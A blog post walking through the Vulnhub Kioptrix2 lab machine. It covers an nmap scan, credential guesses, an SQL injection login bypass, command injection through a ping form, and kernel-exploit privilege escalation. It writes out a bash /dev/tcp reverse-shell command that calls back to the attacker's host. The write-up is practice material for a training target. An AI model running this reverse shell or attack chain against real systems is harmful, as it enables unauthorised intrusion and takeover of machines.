---
title: Vulnhub - Kioptrix2
published: true
---

Hey Guys This is Chan.This is a write up about kioptrix2 from vlunhub.

This is an really easy machine.So let's get jump in 

# [](#haeder-1)Enumeration

# [](#header-2)Port Scan

```
root@kali:~# nmap -sC -sV 192.168.99.42
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 15:11 EST
Nmap scan report for 192.168.99.42
Host is up (0.00019s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
|_ssl-date: 2019-12-30T01:12:18+00:00; +5h00m02s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 08:00:27:FC:FD:CE (Oracle VirtualBox virtual NIC)

Host script results:
|_clock-skew: 5h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.63 seconds
```
When I check nmap there is nothing was interesting 

So go to the web page 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/web-page.png)

and it is login page so I try 

```admin:admin
guest:guest
adminstrator:admin123
```

So then I try sqli auth bypass payload 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/sqli-admin-test.png.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/web-shell.png.png)

it said ping a machine on the network when I typed test and it show up test

So I realized that I can exute cmd in this so let's try 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/excute-command.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/command-excuted.png)

So here our comd excuted user as apache

So let's try to get reverse shell 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/try%20to%20get%20reverse%20shell.png)

```
bash -i >& /dev/tcp/192.168.99.48/9001 0>&1
```

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/getting%20reverse%20shell.png)

So here we got reverse shell

# [#heaader-2]Privillege Escalation

So here we check the kernal version 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/check%20kernal%20version.png)

```
Kernal Version: 4.5
```
Then search for exploit

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/found%20exploit.png)

Then I upload this exploit to machine 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/upload%20exploit.png)

Compiling the exploit and excute it then we got the shell with root 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/vuln-hub/exute%20exploit%20and%20get%20root.png)

That's it really easy 

Enjoy:-)
